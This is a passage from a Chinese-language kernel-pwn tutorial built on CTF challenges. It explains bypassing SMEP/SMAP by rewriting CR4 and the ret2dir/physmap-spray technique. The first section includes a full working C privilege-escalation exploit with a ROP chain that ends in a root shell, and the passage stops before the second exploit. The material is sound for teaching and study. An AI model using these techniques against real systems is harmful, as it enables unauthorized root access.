<h2 id="ret2usr-with-SMAP-x2F-SMEP-BYPASS"><a href="#ret2usr-with-SMAP-x2F-SMEP-BYPASS" class="headerlink" title="ret2usr with SMAP&#x2F;SMEP BYPASS"></a>ret2usr with SMAP&#x2F;SMEP BYPASS</h2><p>前面我们讲到，当 kernel 开启 SMEP 保护时，ret2usr 这种攻击手法将会引起 kernel panic，因此若是我们仍然想要进行 ret2usr 攻击，则需要先关闭 SMEP 保护</p>
<p>Intel 下系统根据 CR4 控制寄存器的第 20、21 位标识是否开启 SMEP、SMAP 保护（1为开启，0为关闭），<strong>若是能够改变 CR4 寄存器的值便能够关闭 SMEP&#x2F;SMAP 保护</strong>，完成 SMAP&#x2F;SMEP-bypass，接下来就能够重新进行 ret2usr</p>
<p><img src="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们可以通过如下命令查看CPU相关信息，其中包括开启的保护类型：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/cpuinfo</span><br></code></pre></td></tr></table></figure>

<h3 id="例题：强网杯2018-core-2"><a href="#例题：强网杯2018-core-2" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><blockquote>
<p><del>又是 core！典中典的 kernel pwn 入门题！</del></p>
</blockquote>
<p>这一次我们在启动脚本中添加上 smep 与 smap 的选项：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">qemu-system-x86_64 \<br>-m 128M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<p>之后我们重新运行之前的 ret2usr 的 exp，发现直接 kernel panic 了，这是因为我们想要执行用户空间的函数指针，触发了 SMEP 保护</p>
<p><img src="https://s2.loli.net/2022/05/07/f2MXaqwC7kgRx8G.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么这里我们只需要通过 ROP 来关闭 SMEP&amp;SMAP 即可继续 ret2usr，这里笔者用与运算将 SMEP 与 SMAP 的两位给清除掉了，实际上直接给 cr4 赋值 <code>0x6f0</code> 也是可以的（通常关了以后都是这个值）</p>
<p>前面我们使用 swapgs 和 iret 两条指令来返回用户态，这一次我们直接使用 <code>swapgs_restore_regs_and_return_to_usermode</code> 来返回用户态</p>
<p>最终的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_RET 0xffffffff810520cf</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSHFQ_POP_RBX_RET 0xffffffff81131da4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff813eb448</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *);<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreRead</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setOffValue</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds_ptr = commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred_ptr = prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-type">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br><br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + offset;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可完成提权</p>
<p><img src="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>这里笔者选择的 CPU 型号 <code>qemu64-v1</code> 其实是在我们不指定时 QEMU 默认使用的 CPU 型号，但是你可以看到一般的比赛使用的都是 <code>kvm64</code> 这一型号，我们可以使用如下命令查看 QEMU 可用的 CPU 型号及说明</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -cpu <span class="hljs-built_in">help</span><br>Available CPUs:<br>...<br>x86 kvm64                 (<span class="hljs-built_in">alias</span> configured by machine <span class="hljs-built_in">type</span>)<br>...<br>x86 qemu64-v1             QEMU Virtual CPU version 2.5+<br>...<br></code></pre></td></tr></table></figure>

<p>因此大家默认会使用 <code>kvm64</code> 这一型号，那么为什么这里笔者要特意指定成 <code>qemu64-v1</code> 呢，这是因为笔者发现其他型号的 CPU <strong>在关闭 smep、smap 后仍无法正常地 ret2usr</strong>，会在访问用户空间时触发缺页异常</p>
<p><img src="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>造成这种现象的原因是因为<strong>KPTI 机制，对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限</strong>，因此当内核尝试执行用户空间代码时，由于对应页顶级表项没有设置可执行位，因此会直接 panic</p>
<p>kpti 在 <code>qemu64-v1</code> 上默认是关闭的，但在其他型号 CPU 上默认是开启的，所以这里笔者选用该型号来作为修改 cr4 进行 smep&#x2F;smap bypass 的例题，<strong>但实际上 ret2usr 已经是过去式了</strong></p>
</blockquote>
<h1 id="0x03-Kernel-ROP-ret2dir"><a href="#0x03-Kernel-ROP-ret2dir" class="headerlink" title="0x03.Kernel ROP - ret2dir"></a>0x03.Kernel ROP - ret2dir</h1><blockquote>
<p><del>笔者第一次见这个名字的时候还以为是 return to directory：返回至文件夹的攻击，但现在仔细想来至少英文猜的差不多对</del>（</p>
</blockquote>
<p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见此处<a target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">http://www.cs.columbia.edu/~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf</a></p>
<p>我们首先来思考一下 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">x86 下的 Linux kernel 的内存布局</a>，存在着这样的一块区域叫做 <code>direct mapping area</code>，即内核的 <code>线性映射区</code>，<strong>线性地直接映射了整个物理内存空间</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rst">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>好像也没有啥译名，但是叫直接映射区太难听，因为这块映射是线性的（linear），笔者就一直叫他线性映射区</p>
<blockquote>
<p>在 32 位下这块区域似乎只能占 896 MB，虽然 32 位下有最大 4G 的内存空间，不过虽然同样是线性映射区， 32 位和 64 位的内存布局还是有些许不同的，这里我们主要还是关注 64 位</p>
</blockquote>
<p>笔者猜测：buddy system 应当是通过这块映射来管理整个物理内存空间的，尚未查证过源码</p>
<p>这里我们也可以看出 Linux 在 4级页表（地址长度 48 bit）下的最大内存应当为 64 TB 而并非 256 TB，至于为什么缩水了那么多那是另一个故事…</p>
<p>当需要用到大于 64 TB 的内存时，就要开启 5 级页表了，这种情况比较复杂，这里我们就先不深入讨论</p>
</blockquote>
<p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框</p>
<p>当开启了 SMEP、SMAP、PXN 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong></p>
<p>下图便是原论文中对 ret2dir 这种攻击的示例，我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址<strong>在内核空间中访问到</strong></p>
<p><img src="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>但需要注意的是<strong>在新版的内核当中 direct mapping area 已经不再具有可执行权限</strong>，因此我们很难再在用户空间直接布置 shellcode 进行利用，<strong>但我们仍能通过在用户空间布置 ROP 链的方式完成利用</strong></p>
<p><img src="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>基本上布置 shellcode 的方法已经很难直接完成利用了，毕竟这是一篇14年的古老论文，稍微新一点的内核的 direct mapping area 都不再具有可执行权限… </p>
</blockquote>
<p>比较朴素的一种使用 ret2dir 进行攻击的手法便是：</p>
<ul>
<li><p>利用 mmap 在用户空间大量喷射内存</p>
</li>
<li><p>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），<strong>这个地址直接来自于线性映射区</strong></p>
</li>
<li><p>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存</p>
</li>
</ul>
<p><strong>此时我们就获得了一个映射到用户空间的内核空间地址，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段</strong></p>
<p>需要注意的是我们往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code></p>
<blockquote>
<p>还是建议大家把论文原文看一遍23333</p>
</blockquote>
<h2 id="例题：MINI-LCTF2022-kgadget"><a href="#例题：MINI-LCTF2022-kgadget" class="headerlink" title="例题：MINI-LCTF2022 - kgadget"></a>例题：MINI-LCTF2022 - kgadget</h2><blockquote>
<p>笔者在校内赛出的一道题目，算是一道 ret2dir 的例题，<del>因为网上实在是没有这一块的题目…</del></p>
<p><a href="/download/minil2022/pwn/kgadget.tar.xz" title="点此下载原题附件">点击下载-kgadget.tar.xz</a></p>
</blockquote>
<h3 id="①-分析-1"><a href="#①-分析-1" class="headerlink" title="① 分析"></a>① 分析</h3><p>还是惯例的给了个有漏洞的驱动，逆起来其实并不难，唯一有用的就是 ioctl，若 ioctl 的第二个参数为 114514 则会将第三个参数作为指针进行解引用，取其所指地址上值作为函数指针进行执行（这里编译器将其优化为 <code>__x86_indirect_thunk_rbx()</code> ，其实本质上就是 <code>call rbx</code> ）</p>
<p><img src="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在启动脚本中开启了 smep 与 smap 保护，所以我们不能够直接在用户空间构造 rop 然后 ret2usr，但是由于没有开启 kaslr，所以我们也不需要泄露内核基址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64,+smep,+smap \<br>    -smp cores=2,threads=2 \<br>    -kernel bzImage \<br>    -initrd ./rootfs.cpio \<br>    -nographic \<br>    -monitor /dev/null \<br>    -snapshot \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \<br>    -no-reboot<br></code></pre></td></tr></table></figure>

<h3 id="②-漏洞利用：ret2dir-physmap-spray"><a href="#②-漏洞利用：ret2dir-physmap-spray" class="headerlink" title="② 漏洞利用：ret2dir + physmap spray"></a>② 漏洞利用：ret2dir + physmap spray</h3><p>因为我们没法直接在内核空间直接找到一个这样的目标（内核空间中虽然存在能够这样进行调用的函数指针，例如 tty 设备默认的函数表<code>ptm_unix98_ops</code> 一类的，但是这些函数表对应的函数指针对我们来说没有用），所以我们需要手动去<strong>在内核空间布置我们的函数指针与 rop chain</strong>，之后我们传入我们布置的 gadget 的地址就能进行利用了</p>
<p>那么我们如何在内核空间布置我们的恶意数据呢？可能有的人就会想到 <code>msg_msg</code> 、<code>sk_buff</code> 等一系列常用来进行堆喷的结构体，<strong>但其实我们并不需要显式地在内核空间布置数据，而是可以通过一个位于内核空间中的地址直接访问到用户空间中的数据</strong>——那就是映射了整个物理内存的 <code>direct mapping area</code></p>
<p>我们不难想到的是，<strong>我们为用户空间所分配的每一张内存页，在内核空间中都能通过这块内存区域访问到</strong>，因此我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong></p>
<blockquote>
<p>当然，使用 <code>msg_msg</code> 或者 <code>sk_buff</code> 在内核空间中布置恶意数据也可以，不过在笔者看来对这题而言是多此一举…</p>
</blockquote>
<p>那么现在又出现一个新的问题，<strong>我们如何得知我们布置的恶意数据在内核空间中的对应地址呢？</strong>我们无法进行内核空间中的内存搜索，因此也就无法直接得知我们布置的恶意数据在内核空间中的地址</p>
<p><strong>答案是不需要搜索</strong>，这里我们使用<a target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">原论文</a>中的一种名为 <code>physmap spray</code> 的攻击手法——<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个 direct mapping area 上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong></p>
<p>经笔者实测当我们喷射的内存页数量达到一定数量级时<strong>我们总能准确地在 direct mapping area 靠中后部的区域命中我们的恶意数据</strong></p>
<p>最后就是 gadget 的挑选与 rop chain 的构造了，我们不难想到的是可以通过形如 <code>add rsp, val ; ret</code> 的 gadget 跳转到内核栈上的 <code>pt_regs</code> 上，在上面布置提权的 rop chain，但在本题当中 <code>pt_regs</code> 只有 r9 与 r8 两个寄存器可用，笔者提前对内核栈进行了清理——</p>
<p><img src="https://s2.loli.net/2022/05/07/xik67DJWKez9FNl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>编译器优化成了 qmemcpy，其实笔者源码里是逐个寄存器赋值的</p>
</blockquote>
<p>但其实仅有两个寄存器也够用了，我们可以利用 <code>pop_rsp ; ret</code> 的 gadget 进行栈迁移，<strong>将栈迁移到我们在用户空间所布置的恶意数据上</strong>，随后我们直接在恶意数据靠后的位置布置提权降落回用户态的 rop chain 即可</p>
<p>由于 buddy system 以页为单位进行内存分配，所以笔者也以页为单位进行 physmap spray，以求能消耗更多的物理内存，提高命中率，这里笔者懒得去计算偏移了，所以在每张内存页上布置的都是“三段式”的 rop chain，将我们跳转到 <code>pt_regs</code> 的 gadget 同时用作 slide code——</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">------------------------</span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret</span><br><span class="hljs-code">...</span><br><span class="hljs-code">add rsp, val ; ret # 该gadget必定会命中下一个区域中的一条ret，之后便能平缓地“滑”到常规的提权 rop 上</span><br><span class="hljs-code">------------------------</span><br>ret<br>ret<br><span class="hljs-bullet">...</span><br><span class="hljs-bullet"></span><span class="hljs-section">ret</span><br><span class="hljs-section">------------------------</span><br><span class="hljs-section">common root ROP chain</span><br><span class="hljs-section">------------------------</span><br></code></pre></td></tr></table></figure>

<h3 id="③-final-exploit"><a href="#③-final-exploit" class="headerlink" title="③ final exploit"></a>③ final exploit</h3><p>最后的 exp 如下：</p>
